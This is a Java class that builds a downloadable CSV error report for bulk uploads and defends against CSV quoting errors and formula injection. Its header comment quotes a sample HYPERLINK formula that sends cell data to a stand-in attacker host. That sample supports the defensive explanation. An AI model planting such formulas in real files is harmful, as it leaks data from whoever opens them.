package com.perimity.gatepass.bulk;

import com.perimity.gatepass.dto.response.RowErrorResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.util.List;
import org.springframework.stereotype.Component;

/**
 * Writes the "row 34: invalid email" report the uploader downloads.
 *
 * ==========================================================================
 *  TWO SEPARATE ESCAPING PROBLEMS, BOTH HANDLED HERE.
 * ==========================================================================
 *
 * 1. CSV QUOTING. A purpose or name containing a comma, a quote or a newline
 *    has to be quoted or the file has the wrong number of columns from that
 *    row onward. Standard RFC 4180: wrap in quotes, double any inner quote.
 *
 * 2. CSV INJECTION (a.k.a. formula injection). This is the one people miss.
 *    A cell whose text begins with = + - or @ is interpreted by Excel and
 *    Google Sheets as a FORMULA when the file is opened. An attacker who can
 *    get a row into a bulk upload can put
 *
 *        =HYPERLINK("http://evil/?d="&A1,"Click to fix this row")
 *
 *    in the name field, and the error report we hand back to a Campus Admin
 *    becomes an attack on the Campus Admin. This is a real, exploited class of
 *    bug, not a theoretical one. The defence is to prefix such a cell with a
 *    single quote so the spreadsheet treats it as text.
 *
 * WHY THIS FILE MATTERS FOR THE \s DEFECT: the report echoes the uploader's own
 * name and email text straight back out. gatepass-service's PERSON_NAME pattern
 * currently uses \\s inside its character class, and Java's \s matches \n and
 * \r as well as a space - so a name field containing a newline passes
 * validation today. Sanitising here is belt; fixing ValidationPatterns line 60
 * to a literal space is braces. Do both.
 */
@Component
public class ErrorReportWriter {

    public static final String CONTENT_TYPE = "text/csv";

    /**
     * Characters a spreadsheet treats as the start of a formula. The tab and
     * carriage return are included because both Excel and Sheets strip leading
     * whitespace before deciding, so " =cmd" is still a formula.
     */
    private static final String FORMULA_STARTERS = "=+-@\t\r";

    /**
     * @return the CSV bytes, ready to hand to StorageService.put
     */
    public byte[] write(List<RowErrorResponse> errors) {

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        // UTF-8 BOM. Without it Excel on Windows opens a UTF-8 CSV as the
        // system codepage and every non-ASCII name is mojibake - which, for a
        // report that exists to help someone FIX names, is a bad look.
        out.write(0xEF);
        out.write(0xBB);
        out.write(0xBF);

        try (Writer w = new OutputStreamWriter(out, StandardCharsets.UTF_8)) {

            w.write("Row,Email,Problem\r\n");

            for (RowErrorResponse e : errors) {
                w.write(String.valueOf(e.rowNumber()));
                w.write(',');
                w.write(csv(e.email()));
                w.write(',');
                w.write(csv(e.reason()));
                w.write("\r\n");
            }

        } catch (IOException e) {
            // A ByteArrayOutputStream cannot actually fail, but the checked
            // exception has to go somewhere and swallowing it silently would
            // produce a truncated report with no explanation.
            throw new IllegalStateException("Could not build the error report", e);
        }

        return out.toByteArray();
    }

    public ByteArrayInputStream stream(List<RowErrorResponse> errors) {
        return new ByteArrayInputStream(write(errors));
    }

    /**
     * One CSV field: neutralised against formula injection, then quoted.
     *
     * Order matters. Prefix first, quote second - quoting first and then
     * prefixing would put the apostrophe outside the quotes where the
     * spreadsheet ignores it.
     */
    private String csv(String value) {
        if (value == null || value.isEmpty()) {
            return "";
        }

        String v = value;

        if (FORMULA_STARTERS.indexOf(v.charAt(0)) >= 0) {
            v = "'" + v;
        }

        // Newlines are legal inside a quoted CSV field, but a newline in a
        // NAME is never legitimate and is the log-forgery shape. Flattened to
        // a space so one bad row stays one line in the report.
        v = v.replace("\r\n", " ").replace('\n', ' ').replace('\r', ' ');

        return "\"" + v.replace("\"", "\"\"") + "\"";
    }
}
